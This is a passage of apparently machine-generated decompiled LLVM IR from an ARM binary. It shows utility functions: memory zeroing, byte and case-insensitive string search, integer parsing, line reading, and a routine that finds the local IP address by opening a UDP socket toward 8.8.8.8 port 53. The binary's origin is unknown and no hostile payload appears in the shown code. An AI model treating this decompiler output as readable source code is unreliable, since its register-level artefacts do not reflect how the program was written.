  %v0_12408 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12404, i32 %v0_12408)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12410

dec_label_pc_12410:                               ; preds = %dec_label_pc_12410, %dec_label_pc_12404
  %v2_12414 = phi i32 [ %v1_12418, %dec_label_pc_12410 ], [ 0, %dec_label_pc_12404 ]
  store i32 0, i32* @r3, align 4
  %v4_12414 = add i32 %v2_12414, %arg1
  %v5_12414 = inttoptr i32 %v4_12414 to i8*
  store i8 0, i8* %v5_12414, align 1
  %v0_12418 = load i32, i32* %r2.global-to-local, align 4
  %v1_12418 = add i32 %v0_12418, 1
  store i32 %v1_12418, i32* %r2.global-to-local, align 4
  %v9_1241c = icmp eq i32 %v1_12418, %arg2
  br i1 %v9_1241c, label %dec_label_pc_12424, label %dec_label_pc_12410

dec_label_pc_12424:                               ; preds = %dec_label_pc_12410
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12418, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12428(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12428:
  %v7_1243c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_1243c, label %dec_label_pc_12444, label %dec_label_pc_1244c

dec_label_pc_12444:                               ; preds = %dec_label_pc_12460, %dec_label_pc_1244c, %dec_label_pc_12428, %dec_label_pc_1248c
  %storemerge = phi i32 [ %v1_1248c, %dec_label_pc_1248c ], [ -1, %dec_label_pc_12428 ], [ -1, %dec_label_pc_1244c ], [ -1, %dec_label_pc_12460 ]
  ret i32 %storemerge

dec_label_pc_1244c:                               ; preds = %dec_label_pc_12428
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_12444, label %dec_label_pc_12454

dec_label_pc_12454:                               ; preds = %dec_label_pc_1244c
  br label %dec_label_pc_1246c

dec_label_pc_12460:                               ; preds = %bb, %dec_label_pc_12480
  %v1_1246c3 = phi i32 [ %v1_12480, %dec_label_pc_12480 ], [ 0, %bb ]
  %v1_12460 = add i32 %v0_1248c, 1
  %v9_12464 = icmp eq i32 %v1_12460, %arg2
  br i1 %v9_12464, label %dec_label_pc_12444, label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %dec_label_pc_12460, %dec_label_pc_12454
  %v0_1248c = phi i32 [ %v1_12460, %dec_label_pc_12460 ], [ 0, %dec_label_pc_12454 ]
  %v1_1246c = phi i32 [ %v1_1246c3, %dec_label_pc_12460 ], [ 0, %dec_label_pc_12454 ]
  %v2_1246c = add i32 %v1_1246c, %arg3
  %v3_1246c = inttoptr i32 %v2_1246c to i8*
  %v4_1246c = load i8, i8* %v3_1246c, align 1
  %v2_12470 = add i32 %v0_1248c, %arg1
  %v3_12470 = inttoptr i32 %v2_12470 to i8*
  %v4_12470 = load i8, i8* %v3_12470, align 1
  %v9_12474 = icmp eq i8 %v4_12470, %v4_1246c
  br i1 %v9_12474, label %dec_label_pc_12480, label %bb

bb:                                               ; preds = %dec_label_pc_1246c
  br label %dec_label_pc_12460

dec_label_pc_12480:                               ; preds = %dec_label_pc_1246c
  %v1_12480 = add i32 %v1_1246c, 1
  %v9_12484 = icmp eq i32 %v1_12480, %arg4
  br i1 %v9_12484, label %dec_label_pc_1248c, label %dec_label_pc_12460

dec_label_pc_1248c:                               ; preds = %dec_label_pc_12480
  %v1_1248c = add i32 %v0_1248c, 1
  br label %dec_label_pc_12444

; uselistorder directives
  uselistorder i32 %v1_12480, { 1, 0 }
  uselistorder i32 %v1_1246c, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12460, { 1, 0 }
  uselistorder label %dec_label_pc_12444, { 3, 0, 1, 2 }
}

define i32 @function_12494(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12494:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_12494 = load i32, i32* @r4, align 4
  %v6_12494 = load i32, i32* @r5, align 4
  %v12_12494 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_124a4

dec_label_pc_124a4:                               ; preds = %.thread, %dec_label_pc_124b8, %bb, %dec_label_pc_12494
  %v0_124a4 = phi i32 [ %tmp, %dec_label_pc_12494 ], [ %v5_124a4, %bb ], [ %v5_124a4, %dec_label_pc_124b8 ], [ %v5_124a4, %.thread ]
  %v1_124a4 = inttoptr i32 %v0_124a4 to i8*
  %v2_124a4 = load i8, i8* %v1_124a4, align 1
  %v5_124a4 = add i32 %v0_124a4, 1
  store i32 %v5_124a4, i32* @r5, align 4
  %v7_124a8 = icmp eq i8 %v2_124a4, 9
  br i1 %v7_124a8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_124a4
  br label %dec_label_pc_124a4

bb:                                               ; preds = %dec_label_pc_124a4
  %v3_124a4 = zext i8 %v2_124a4 to i32
  %v8_124ac = icmp eq i8 %v2_124a4, 32
  store i32 %v3_124a4, i32* @r4, align 4
  br i1 %v8_124ac, label %dec_label_pc_124a4, label %dec_label_pc_124b8

dec_label_pc_124b8:                               ; preds = %bb
  %v7_124b8 = icmp eq i8 %v2_124a4, 10
  br i1 %v7_124b8, label %dec_label_pc_124a4, label %dec_label_pc_124c0

dec_label_pc_124c0:                               ; preds = %dec_label_pc_124b8
  %v7_124c0 = icmp eq i8 %v2_124a4, 45
  br i1 %v7_124c0, label %dec_label_pc_125b0, label %dec_label_pc_124c8

dec_label_pc_124c8:                               ; preds = %dec_label_pc_124c0
  %v7_124c8 = icmp eq i8 %v2_124a4, 43
  br i1 %v7_124c8, label %bb44, label %dec_label_pc_124d8

bb44:                                             ; preds = %dec_label_pc_124c8
  %v2_124cc = inttoptr i32 %v5_124a4 to i8*
  %v3_124cc = load i8, i8* %v2_124cc, align 1
  %v4_124cc = zext i8 %v3_124cc to i32
  store i32 %v4_124cc, i32* @r4, align 4
  %v6_124cc = add i32 %v0_124a4, 2
  store i32 %v6_124cc, i32* @r5, align 4
  br label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %bb44, %dec_label_pc_124c8, %dec_label_pc_125b0
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_125b0 ], [ 2147483647, %dec_label_pc_124c8 ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_125b0 ], [ 0, %dec_label_pc_124c8 ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_124e0 = call i32 @function_12a68(i32 %storemerge1, i32 %arg2)
  %v0_124e4 = load i32, i32* @r7, align 4
  store i32 %v0_124e4, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_124ec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_124ec, i32* @r1, align 4
  %v0_124f0 = call i32 @function_1296c()
  %v0_12500.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12500.outer

dec_label_pc_12500.outer:                         ; preds = %.thread5, %dec_label_pc_124d8
  %v2_1257c.ph = phi i32 [ %v5_1257c, %.thread5 ], [ 0, %dec_label_pc_124d8 ]
  %v1_12540.ph = phi i32 [ %v4_12580, %.thread5 ], [ %v0_12500.pre, %dec_label_pc_124d8 ]
  %v1_12558.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_124d8 ]
  %v3_1254c = icmp uge i32 %v2_1257c.ph, %v0_124f0
  %v9_1254c = icmp eq i32 %v2_1257c.ph, %v0_124f0
  %v2_12550 = xor i1 %v3_1254c, true
  %v3_12550 = or i1 %v9_1254c, %v2_12550
  %v2_12554 = xor i1 %v9_1254c, true
  %v3_12554 = and i1 %v3_1254c, %v2_12554
  %v2_12574 = icmp eq i1 %v9_1254c, false
  br label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %dec_label_pc_12500.outer, %dec_label_pc_12588
  %v1_12558 = phi i32 [ -1, %dec_label_pc_12588 ], [ %v1_12558.ph, %dec_label_pc_12500.outer ]
  %v1_12540 = phi i32 [ %v3_12588, %dec_label_pc_12588 ], [ %v1_12540.ph, %dec_label_pc_12500.outer ]
  %v1_12500 = urem i32 %v1_12540, 256
  %v1_12504 = add nsw i32 %v1_12500, -48
  %v1_1250c = add nsw i32 %v1_12500, -97
  %v1_12510 = add i32 %v1_12540, -48
  store i32 %v1_12510, i32* @r2, align 4
  %v1_12514 = add nsw i32 %v1_12500, -65
  %tmp75 = icmp ult i32 %v1_12504, 10
  br i1 %tmp75, label %dec_label_pc_12544, label %dec_label_pc_1251c

dec_label_pc_1251c:                               ; preds = %dec_label_pc_12500
  %v2_1251c = icmp ugt i32 %v1_12514, 24
  %v7_1251c = icmp eq i32 %v1_12514, 25
  %v2_12520 = xor i1 %v7_1251c, true
  %v3_12520 = and i1 %v2_1251c, %v2_12520
  br i1 %v3_12520, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1251c
  store i32 0, i32* @r2, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1251c, %bb45
  %v0_1253414 = phi i32 [ %v1_12510, %dec_label_pc_1251c ], [ 0, %bb45 ]
  %v2_12524 = xor i1 %v2_1251c, true
  %v3_12524 = or i1 %v7_1251c, %v2_12524
  br i1 %v3_12524, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  store i32 1, i32* @r2, align 4
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_12534 = phi i32 [ %v0_1253414, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_12520, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_1252c = icmp ugt i32 %v1_1250c, 24
  %v11_1252c = icmp eq i32 %v1_1250c, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_12530 = phi i1 [ %v7_1251c, %bb48 ], [ %v11_1252c, %bb49 ]
  %v0_12530 = phi i1 [ %v2_1251c, %bb48 ], [ %v6_1252c, %bb49 ]
  %v2_12530 = xor i1 %v1_12530, true
  %v3_12530 = and i1 %v0_12530, %v2_12530
  br i1 %v3_12530, label %dec_label_pc_12594, label %dec_label_pc_12534

dec_label_pc_12534:                               ; preds = %bb50
  %v2_12534 = icmp eq i32 %v0_12534, 0
  %. = select i1 %v2_12534, i32 87, i32 55
  %v2_12540 = sub i32 %v1_12540, %.
  store i32 %v2_12540, i32* @r2, align 4
  br label %dec_label_pc_12544

dec_label_pc_12544:                               ; preds = %dec_label_pc_12500, %dec_label_pc_12534
  %v0_1255829 = phi i32 [ %v1_12514, %dec_label_pc_12500 ], [ %., %dec_label_pc_12534 ]
  %v3_1257c = phi i32 [ %v1_12510, %dec_label_pc_12500 ], [ %v2_12540, %dec_label_pc_12534 ]
  %v1_12544 = load i32, i32* %r6.global-to-local, align 4
  %v2_12544 = sub i32 %v3_1257c, %v1_12544
  %v4_12544 = xor i32 %v1_12544, %v3_1257c
  %v5_12544 = xor i32 %v2_12544, %v3_1257c
  %v6_12544 = and i32 %v5_12544, %v4_12544
  %v7_12544 = icmp slt i32 %v6_12544, 0
  %v8_12544 = icmp slt i32 %v2_12544, 0
  %v2_12548 = xor i1 %v8_12544, %v7_12544
  br i1 %v2_12548, label %dec_label_pc_1254c, label %dec_label_pc_12594

dec_label_pc_1254c:                               ; preds = %dec_label_pc_12544
  br i1 %v3_12550, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_1254c
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_1254c, %bb53
  %v0_1255828 = phi i32 [ %v0_1255829, %dec_label_pc_1254c ], [ 0, %bb53 ]
  br i1 %v3_12554, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_12558 = phi i32 [ %v0_1255828, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_12558, 0
  %v4_12558 = zext i1 %tmp76 to i32
  %v5_12558 = or i32 %v0_12558, %v4_12558
  %v7_12558 = icmp eq i32 %v5_12558, 0
  br i1 %v7_12558, label %dec_label_pc_12560, label %dec_label_pc_12588

dec_label_pc_12560:                               ; preds = %bb56
  %v1_1256c = load i32, i32* %r8.global-to-local, align 4
  %v2_1256c = sub i32 %v3_1257c, %v1_1256c
  %v4_1256c = xor i32 %v1_1256c, %v3_1257c
  %v5_1256c = xor i32 %v2_1256c, %v3_1257c
  %v6_1256c = and i32 %v5_1256c, %v4_1256c
  %v7_1256c = icmp slt i32 %v6_1256c, 0
  %v8_1256c = icmp slt i32 %v2_1256c, 0
  %v9_1256c = icmp eq i32 %v3_1257c, %v1_1256c
  %v3_12570 = xor i1 %v8_1256c, %v7_1256c
  %v4_12570 = or i1 %v9_1256c, %v3_12570
  br i1 %v4_12570, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_12560
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_12560
  br i1 %v2_12574, label %.thread5, label %dec_label_pc_12588

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_1257c = mul i32 %v1_12544, %v2_1257c.ph
  %v5_1257c = add i32 %v4_1257c, %v3_1257c
  %v1_12580 = load i32, i32* @r5, align 4
  %v2_12580 = inttoptr i32 %v1_12580 to i8*
  %v3_12580 = load i8, i8* %v2_12580, align 1
  %v4_12580 = zext i8 %v3_12580 to i32
  %v6_12580 = add i32 %v1_12580, 1
  store i32 %v6_12580, i32* @r5, align 4
  br label %dec_label_pc_12500.outer

dec_label_pc_12588:                               ; preds = %thread-pre-split, %bb56
  %v0_12588 = load i32, i32* @r5, align 4
  %v1_12588 = inttoptr i32 %v0_12588 to i8*
  %v2_12588 = load i8, i8* %v1_12588, align 1
  %v3_12588 = zext i8 %v2_12588 to i32
  %v5_12588 = add i32 %v0_12588, 1
  store i32 %v5_12588, i32* @r5, align 4
  br label %dec_label_pc_12500

dec_label_pc_12594:                               ; preds = %dec_label_pc_12544, %bb50
  %v1_12594 = icmp slt i32 %v1_12558, 0
  %v0_125c0 = load i32, i32* %sl.global-to-local, align 4
  %v2_125c0 = icmp eq i32 %v0_125c0, 0
  br i1 %v1_12594, label %dec_label_pc_125c0, label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12594
  br i1 %v2_125c0, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_1259c
  %v2_125a0 = sub i32 0, %v2_1257c.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_1259c, %bb59
  %v1_125ac = phi i32 [ -2147483648, %bb61 ], [ %v2_1257c.ph, %dec_label_pc_1259c ], [ %v2_125a0, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_12494, i32* @r4, align 4
  store i32 %v6_12494, i32* @r5, align 4
  store i32 %v12_12494, i32* @r7, align 4
  ret i32 %v1_125ac

dec_label_pc_125b0:                               ; preds = %dec_label_pc_124c0
  %v1_125b0 = inttoptr i32 %v5_124a4 to i8*
  %v2_125b0 = load i8, i8* %v1_125b0, align 1
  %v3_125b0 = zext i8 %v2_125b0 to i32
  store i32 %v3_125b0, i32* @r4, align 4
  %v5_125b0 = add i32 %v0_124a4, 2
  store i32 %v5_125b0, i32* @r5, align 4
  br label %dec_label_pc_124d8

dec_label_pc_125c0:                               ; preds = %dec_label_pc_12594
  br i1 %v2_125c0, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_125c0
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_125c0
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_125c0, { 1, 0 }
  uselistorder i32 %v2_1256c, { 1, 0 }
  uselistorder i32 %v1_1256c, { 1, 0, 2 }
  uselistorder i32 %v2_12544, { 1, 0 }
  uselistorder i32 %v3_1257c, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_1251c, { 1, 2, 0 }
  uselistorder i1 %v2_1251c, { 1, 0, 2 }
  uselistorder i32 %v1_12500, { 1, 2, 0 }
  uselistorder i32 %v1_12540, { 1, 2, 0 }
  uselistorder i32 %v1_12558, { 1, 0 }
  uselistorder i1 %v9_1254c, { 1, 0, 2 }
  uselistorder i1 %v3_1254c, { 1, 0 }
  uselistorder i32 %v2_1257c.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_124f0, { 1, 0 }
  uselistorder i32 %v5_124a4, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_124a4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_124a4, { 0, 1, 3, 2 }
  uselistorder i8 9, { 5, 0, 1, 4, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_12544, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_12500, { 1, 0 }
  uselistorder label %dec_label_pc_124d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124a4, { 1, 2, 0, 3 }
}

define i32 @function_125d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_125d0:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_125d0 = load i32, i32* @r4, align 4
  store i32 %v3_125d0, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %dec_label_pc_1260c.dec_label_pc_125e8_crit_edge, %dec_label_pc_125d0
  %v0_125ec = phi i32 [ %v0_125ec.pre, %dec_label_pc_1260c.dec_label_pc_125e8_crit_edge ], [ %arg3, %dec_label_pc_125d0 ]
  %v0_125e8 = phi i32 [ %v5_1260c, %dec_label_pc_1260c.dec_label_pc_125e8_crit_edge ], [ %tmp, %dec_label_pc_125d0 ]
  %v4_125f4 = call i32 @function_15be8(i32 %v0_125ec, i32 %v0_125e8, i32 1)
  %v7_125f8 = icmp eq i32 %v4_125f4, 1
  %v0_12600 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_125f8, label %dec_label_pc_12600, label %dec_label_pc_12618

dec_label_pc_12600:                               ; preds = %dec_label_pc_125e8
  %v1_12600 = add i32 %v0_12600, 1
  store i32 %v1_12600, i32* %r5.global-to-local, align 4
  %v1_12604 = load i32, i32* %r8.global-to-local, align 4
  %v6_12608 = icmp slt i32 %v1_12600, %v1_12604
  br i1 %v6_12608, label %dec_label_pc_1260c, label %.loopexit

dec_label_pc_1260c:                               ; preds = %dec_label_pc_12600
  %v0_1260c = load i32, i32* @r4, align 4
  %v1_1260c = inttoptr i32 %v0_1260c to i8*
  %v2_1260c = load i8, i8* %v1_1260c, align 1
  %v5_1260c = add i32 %v0_1260c, 1
  store i32 %v5_1260c, i32* @r4, align 4
  %v7_12610 = icmp eq i8 %v2_1260c, 10
  br i1 %v7_12610, label %dec_label_pc_12618, label %dec_label_pc_1260c.dec_label_pc_125e8_crit_edge

dec_label_pc_1260c.dec_label_pc_125e8_crit_edge:  ; preds = %dec_label_pc_1260c
  %v0_125ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_125e8

dec_label_pc_12618:                               ; preds = %dec_label_pc_125e8, %dec_label_pc_1260c
  %v0_12618 = phi i32 [ %v1_12600, %dec_label_pc_1260c ], [ %v0_12600, %dec_label_pc_125e8 ]
  %v2_12618 = icmp eq i32 %v0_12618, 0
  br i1 %v2_12618, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_12618
  store i32 0, i32* %r7.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_12600, %dec_label_pc_12618, %bb
  %v0_12620 = load i32, i32* %r7.global-to-local, align 4
  %v2_12624 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12624, i32* @r4, align 4
  ret i32 %v0_12620

; uselistorder directives
  uselistorder i32 %v5_1260c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_15be8, { 3, 1, 0, 2 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12618, { 1, 0 }
}

define i32 @function_1262c() local_unnamed_addr {
dec_label_pc_1262c:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1262c = load i32, i32* @r4, align 4
  %v6_1262c = load i32, i32* @r5, align 4
  %v9_1262c = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_1263c = call i32 @function_12f18()
  store i32 0, i32* @r4, align 4
  %v2_12644 = inttoptr i32 %v0_1263c to i32*
  store i32 0, i32* %v2_12644, align 4
  %v0_12650 = load i32, i32* @r4, align 4
  %v3_12654 = call i32 @function_14ba0(i32 2, i32 2, i32 %v0_12650)
  %v7_12658 = icmp eq i32 %v3_12654, -1
  store i32 %v3_12654, i32* @r5, align 4
  br i1 %v7_12658, label %bb, label %dec_label_pc_12668

bb:                                               ; preds = %dec_label_pc_1262c
  %v1_12660 = load i32, i32* @r4, align 4
  br label %dec_label_pc_126c0

dec_label_pc_12668:                               ; preds = %dec_label_pc_1262c
  store i32 2, i32* %stack_var_-36, align 4
  %v1_1267c = call i32 @function_14874(i32 134744072)
  %v1_12688 = call i32 @function_14898(i32 53)
  %v2_1268c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1268c, i32* @r4, align 4
  %v0_12694 = load i32, i32* @r6, align 4
  %v0_1269c = load i32, i32* @r5, align 4
  %v3_126a0 = call i32 @function_147e4(i32 %v0_1269c, i32 %v2_1268c, i32 %v0_12694)
  %v2_126a8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_126a8, i32* @r2, align 4
  %v0_126ac = load i32, i32* @r5, align 4
  %v3_126b0 = call i32 @function_14828(i32 %v0_126ac, i32 %v2_1268c, i32 %v2_126a8)
  %v0_126b4 = load i32, i32* @r5, align 4
  store i32 %v0_126b4, i32* @r0, align 4
  %v1_126b8 = call i32 @function_15b6c(i32 %v0_126b4)
  br label %dec_label_pc_126c0

dec_label_pc_126c0:                               ; preds = %bb, %dec_label_pc_12668
  %storemerge = phi i32 [ %v1_1267c, %dec_label_pc_12668 ], [ %v1_12660, %bb ]
  store i32 %v3_1262c, i32* @r4, align 4
  store i32 %v6_1262c, i32* @r5, align 4
  store i32 %v9_1262c, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_12654, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_147e4, { 2, 8, 1, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32)* @function_14898, { 11, 10, 9, 8, 2, 1, 5, 4, 91, 90, 89, 88, 87, 86, 85, 92, 84, 83, 82, 7, 6, 81, 80, 3, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 64, 63, 67, 66, 65, 62, 58, 57, 61, 60, 59, 56, 55, 54, 53, 48, 47, 52, 51, 50, 49, 46, 45, 41, 40, 44, 43, 42, 39, 38, 37, 36, 35, 34, 33, 32, 31, 24, 23, 30, 29, 28, 27, 26, 25, 22, 21, 13, 12, 20, 19, 18, 17, 16, 15, 14, 0 }
  uselistorder i32 53, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_14874, { 3, 2, 1, 17, 18, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 (i32, i32, i32)* @function_14ba0, { 4, 19, 1, 3, 18, 17, 2, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_126c0, { 1, 0 }
}

define i32 @function_126cc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_126cc:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_126d0 = load i8, i8* %tmp, align 1
  %v2_126d4 = icmp eq i8 %v3_126d0, 0
  br i1 %v2_126d4, label %bb, label %dec_label_pc_126e8

bb:                                               ; preds = %dec_label_pc_126cc
  %v4_126d0 = zext i8 %v3_126d0 to i32
  br label %dec_label_pc_126fc

dec_label_pc_126e8:                               ; preds = %dec_label_pc_126cc
  br label %dec_label_pc_126ec

dec_label_pc_126ec:                               ; preds = %dec_label_pc_126ec, %dec_label_pc_126e8
  %v0_126ec = phi i32 [ %v1_126ec, %dec_label_pc_126ec ], [ 0, %dec_label_pc_126e8 ]
  %v1_126ec = add i32 %v0_126ec, 1
  %v2_126f0 = add i32 %v1_126ec, %arg2
  %v3_126f0 = inttoptr i32 %v2_126f0 to i8*
  %v4_126f0 = load i8, i8* %v3_126f0, align 1
  %v2_126f4 = icmp eq i8 %v4_126f0, 0
  br i1 %v2_126f4, label %dec_label_pc_126fc, label %dec_label_pc_126ec

dec_label_pc_126fc:                               ; preds = %dec_label_pc_126ec, %bb
  %v0_1274021 = phi i32 [ %v4_126d0, %bb ], [ %v1_126ec, %dec_label_pc_126ec ]
  store i32 0, i32* @r2, align 4
  %v0_127042 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_127042, 1
  br i1 %tmp29, label %dec_label_pc_12754, label %dec_label_pc_12710

dec_label_pc_12710:                               ; preds = %dec_label_pc_126fc, %dec_label_pc_12704.backedge
  %v0_12708.in = phi i32 [ %v0_12708, %dec_label_pc_12704.backedge ], [ %v0_127042, %dec_label_pc_126fc ]
  %v1_1271c = phi i32 [ %v1_1271c15, %dec_label_pc_12704.backedge ], [ 0, %dec_label_pc_126fc ]
  %v0_12710 = phi i32 [ %v5_12710, %dec_label_pc_12704.backedge ], [ %tmp23, %dec_label_pc_126fc ]
  %v0_12708 = add i32 %v0_12708.in, -1
  %v1_12710 = inttoptr i32 %v0_12710 to i8*
  %v2_12710 = load i8, i8* %v1_12710, align 1
  %v3_12710 = zext i8 %v2_12710 to i32
  store i32 %v3_12710, i32* @ip, align 4
  %v5_12710 = add i32 %v0_12710, 1
  %v1_12714 = add nsw i32 %v3_12710, -65
  %v2_1271c = add i32 %v1_1271c, %arg2
  %v3_1271c = inttoptr i32 %v2_1271c to i8*
  %v4_1271c = load i8, i8* %v3_1271c, align 1
  %v6_1271c = zext i8 %v4_1271c to i32
  %v1_12720 = add nsw i32 %v6_1271c, -65
  %tmp38 = icmp ult i32 %v1_12714, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_12710
  %v5_12724 = or i32 %v3_12710, 96
  store i32 %v5_12724, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_12710, %bb30
  %v0_12730 = phi i32 [ %v3_12710, %dec_label_pc_12710 ], [ %v5_12724, %bb30 ]
  %tmp39 = icmp ult i32 %v1_12720, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_1272c = or i32 %v6_1271c, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_12730 = phi i32 [ %v6_1271c, %bb31 ], [ %v5_1272c, %bb32 ]
  %v9_12730 = icmp eq i32 %v0_12730, %v1_12730
  br i1 %v9_12730, label %dec_label_pc_1273c, label %bb34

bb34:                                             ; preds = %bb33
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_12704.backedge

dec_label_pc_12704.backedge:                      ; preds = %bb34, %dec_label_pc_1273c
  %v1_1271c15 = phi i32 [ 0, %bb34 ], [ %v1_1273c, %dec_label_pc_1273c ]
  %tmp35 = icmp slt i32 %v0_12708, 1
  br i1 %tmp35, label %dec_label_pc_12754, label %dec_label_pc_12710

dec_label_pc_1273c:                               ; preds = %bb33
  %v1_1273c = add i32 %v1_1271c, 1
  store i32 %v1_1273c, i32* @r2, align 4
  %v9_12740 = icmp eq i32 %v0_1274021, %v1_1273c
  br i1 %v9_12740, label %dec_label_pc_12748, label %dec_label_pc_12704.backedge

dec_label_pc_12748:                               ; preds = %dec_label_pc_1273c
  %v2_12748 = sub i32 %v5_12710, %tmp23
  br label %dec_label_pc_12754

dec_label_pc_12754:                               ; preds = %dec_label_pc_12704.backedge, %dec_label_pc_126fc, %dec_label_pc_12748
  %storemerge = phi i32 [ %v2_12748, %dec_label_pc_12748 ], [ -1, %dec_label_pc_126fc ], [ -1, %dec_label_pc_12704.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_1273c, { 1, 2, 0 }
  uselistorder i32 %v0_12710, { 1, 0 }
  uselistorder i32 %v1_1271c, { 1, 0 }
  uselistorder i8 %v3_126d0, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
